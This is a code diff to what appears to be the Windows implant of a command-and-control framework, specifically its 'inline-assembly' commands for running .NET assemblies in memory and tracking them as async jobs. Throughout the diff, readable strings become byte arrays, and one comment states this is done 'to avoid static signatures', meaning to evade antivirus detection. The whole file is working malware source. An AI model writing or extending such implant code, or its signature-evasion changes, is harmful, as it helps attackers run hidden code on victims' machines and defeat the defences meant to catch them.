@@ -1,4 +1,4 @@
-// server/docker/payloads/Windows/inline_assembly.go
+// server/docker/payloads/SMB_Windows/inline_assembly.go
 
 //go:build windows
 // +build windows
@@ -13,6 +13,27 @@ import (
 	"strings"
 	"sync"
 	"time"
+)
+
+// Inline assembly strings (constructed to avoid static signatures)
+var (
+	iaOsWindows    = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73})                                                                                                                                                                                                                                                                                       // windows
+	iaCmdName      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79})                                                                                                                                                                                                                                       // inline-assembly
+	iaCmdNameAsync = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63})                                                                                                                                                                                                   // inline-assembly-async
+	iaTypeExe      = string([]byte{0x45, 0x58, 0x45})                                                                                                                                                                                                                                                                                                               // EXE
+	iaTypeDll      = string([]byte{0x44, 0x4c, 0x4c})                                                                                                                                                                                                                                                                                                               // DLL
+	iaStatusRun    = string([]byte{0x72, 0x75, 0x6e, 0x6e, 0x69, 0x6e, 0x67})                                                                                                                                                                                                                                                                                       // running
+	iaStatusFail   = string([]byte{0x66, 0x61, 0x69, 0x6c, 0x65, 0x64})                                                                                                                                                                                                                                                                                             // failed
+	iaStatusKill   = string([]byte{0x6b, 0x69, 0x6c, 0x6c, 0x65, 0x64})                                                                                                                                                                                                                                                                                             // killed
+	iaStatusDone   = string([]byte{0x63, 0x6f, 0x6d, 0x70, 0x6c, 0x65, 0x74, 0x65, 0x64})                                                                                                                                                                                                                                                                           // completed
+	iaJobPrefix    = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x5f, 0x61, 0x73, 0x6d, 0x5f, 0x25, 0x64})                                                                                                                                                                                                                                                   // inline_asm_%d
+	iaTerminated   = string([]byte{0x74, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x75, 0x73, 0x65, 0x72})                                                                                                                                                                                                                     // terminated by user
+	iaExitCode     = string([]byte{0x45, 0x78, 0x69, 0x74, 0x20, 0x63, 0x6f, 0x64, 0x65, 0x3a})                                                                                                                                                                                                                                                                     // Exit code:
+	iaRunFor       = string([]byte{0x2f, 0x72, 0x75, 0x6e, 0x66, 0x6f, 0x72})                                                                                                                                                                                                                                                                                       // /runfor
+	iaFmtExecFail  = string([]byte{0x0a, 0x5b, 0x21, 0x5d, 0x20, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x66, 0x61, 0x69, 0x6c, 0x65, 0x64, 0x3a, 0x20, 0x25, 0x76, 0x0a})                                                                                                                                                                     // \n[!] Execution failed: %v\n
+	iaFmtExecDone  = string([]byte{0x0a, 0x5b, 0x2b, 0x5d, 0x20, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x63, 0x6f, 0x6d, 0x70, 0x6c, 0x65, 0x74, 0x65, 0x64, 0x20, 0x28, 0x65, 0x78, 0x69, 0x74, 0x20, 0x63, 0x6f, 0x64, 0x65, 0x3a, 0x20, 0x25, 0x64, 0x29, 0x0a})                                                                           // \n[+] Execution completed (exit code: %d)\n
+	iaFmtStarted   = string([]byte{0x41, 0x73, 0x79, 0x6e, 0x63, 0x20, 0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x20, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x20, 0x65, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x73, 0x74, 0x61, 0x72, 0x74, 0x65, 0x64, 0x20, 0x28, 0x4a, 0x6f, 0x62, 0x20, 0x49, 0x44, 0x3a, 0x20, 0x25, 0x73, 0x29, 0x0a}) // Async inline assembly execution started (Job ID: %s)\n
+	iaFmtOutput    = string([]byte{0x55, 0x73, 0x65, 0x20, 0x27, 0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20, 0x25, 0x73, 0x27, 0x20, 0x74, 0x6f, 0x20, 0x72, 0x65, 0x74, 0x72, 0x69, 0x65, 0x76, 0x65, 0x20, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})                   // Use 'inline-assembly-output %s' to retrieve output
 )
 
 var (
@@ -42,11 +63,11 @@ func InitializeExitPrevention() {
 type InlineAssemblyCommand struct{}
 
 func (c *InlineAssemblyCommand) Name() string {
-	return "inline-assembly"
+	return iaCmdName
 }
 
 func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	if runtime.GOOS != "windows" {
+	if runtime.GOOS != iaOsWindows {
 		return CommandResult{
 			Output:   Err(E42),
 			ExitCode: 1,
@@ -120,15 +141,15 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 
 	// Detect assembly information
 	isDLL := c.isDLLAssembly(assemblyBytes)
-	assemblyType := "EXE"
+	assemblyType := iaTypeExe
 	if isDLL {
-		assemblyType = "DLL"
+		assemblyType = iaTypeDll
 	}
 	_ = assemblyType // suppress unused warning
 
 	// Check for problematic patterns
 	for _, arg := range config.Arguments {
-		if strings.Contains(strings.ToLower(arg), "/runfor") {
+		if strings.Contains(strings.ToLower(arg), iaRunFor) {
 			output.WriteString(Succ(S26) + "\n")
 			break
 		}
@@ -187,13 +208,13 @@ type InlineAssemblyAsyncCommand struct {
 }
 
 func (c *InlineAssemblyAsyncCommand) Name() string {
-	return "inline-assembly-async"
+	return iaCmdNameAsync
 }
 
 // Execute method for InlineAssemblyAsyncCommand to use the new async execution
 func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	// Generate a unique job ID
-	jobID := fmt.Sprintf("inline_asm_%d", time.Now().UnixNano())
+	jobID := fmt.Sprintf(iaJobPrefix, time.Now().UnixNano())
 
 	// Get the current command from context
 	var currentCmd Command
@@ -209,7 +230,7 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		CommandDBID: currentCmd.CommandDBID,
 		AgentID:     currentCmd.AgentID,
 		Name:        currentCmd.Filename,
-		Status:      "running",
+		Status:      iaStatusRun,
 		StartTime:   time.Now(),
 		CancelChan:  make(chan bool, 1),
 		Command:     currentCmd,
@@ -224,7 +245,7 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		StartTime: time.Now(),
 		Filename:  currentCmd.Filename,
 		Active:    true,
-		Type:      "inline-assembly-async",
+		Type:      iaCmdNameAsync,
 	}
 
 	// Store job info in the global commandQueue
@@ -239,7 +260,7 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		defer func() {
 			if r := recover(); r != nil {
 				job.OutputMutex.Lock()
-				job.Status = "failed"
+				job.Status = iaStatusFail
 				job.Error = fmt.Errorf(ErrCtx(E52, fmt.Sprintf("%v", r)))
 				endTime := time.Now()
 				job.EndTime = &endTime
@@ -278,7 +299,7 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		if currentCmd.Data != "" {
 			if err := json.Unmarshal([]byte(currentCmd.Data), &config); err != nil {
 				job.OutputMutex.Lock()
-				job.Status = "failed"
+				job.Status = iaStatusFail
 				job.Error = err
 				job.Output.WriteString(Err(E44))
 				endTime := time.Now()
@@ -292,7 +313,7 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
 		if err != nil {
 			job.OutputMutex.Lock()
-			job.Status = "failed"
+			job.Status = iaStatusFail
 			job.Error = err
 			job.Output.WriteString(Err(E45))
 			endTime := time.Now()
@@ -304,7 +325,7 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		// Execute with async capture
 		var exitCode int
 
-		if runtime.GOOS == "windows" {
+		if runtime.GOOS == iaOsWindows {
 			// Use the Windows-specific async method
 			tokenContext := captureCurrentAssemblyTokenContext()
 			exitCode, err = c.executeWindowsAssemblyAsync(assemblyBytes, config, job, tokenContext)
@@ -323,19 +344,19 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		job.EndTime = &endTime
 
 		if err != nil {
-			if strings.Contains(err.Error(), "terminated by user") {
-				job.Status = "killed"
+			if strings.Contains(err.Error(), iaTerminated) {
+				job.Status = iaStatusKill
 			} else {
-				job.Status = "failed"
+				job.Status = iaStatusFail
 				job.Error = err
 				if !strings.Contains(job.Output.String(), err.Error()) {
-					job.Output.WriteString(fmt.Sprintf("\n[!] Execution failed: %v\n", err))
+					job.Output.WriteString(fmt.Sprintf(iaFmtExecFail, err))
 				}
 			}
 		} else {
-			job.Status = "completed"
-			if !strings.Contains(job.Output.String(), "Exit code:") {
-				job.Output.WriteString(fmt.Sprintf("\n[+] Execution completed (exit code: %d)\n", exitCode))
+			job.Status = iaStatusDone
+			if !strings.Contains(job.Output.String(), iaExitCode) {
+				job.Output.WriteString(fmt.Sprintf(iaFmtExecDone, exitCode))
 			}
 		}
 
@@ -373,7 +394,7 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 	}()
 
 	return CommandResult{
-		Output:      fmt.Sprintf("Async inline assembly execution started (Job ID: %s)\nUse 'inline-assembly-output %s' to retrieve output", jobID, jobID),
+		Output:      fmt.Sprintf(iaFmtStarted, jobID) + fmt.Sprintf(iaFmtOutput, jobID),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 		JobID:       jobID,
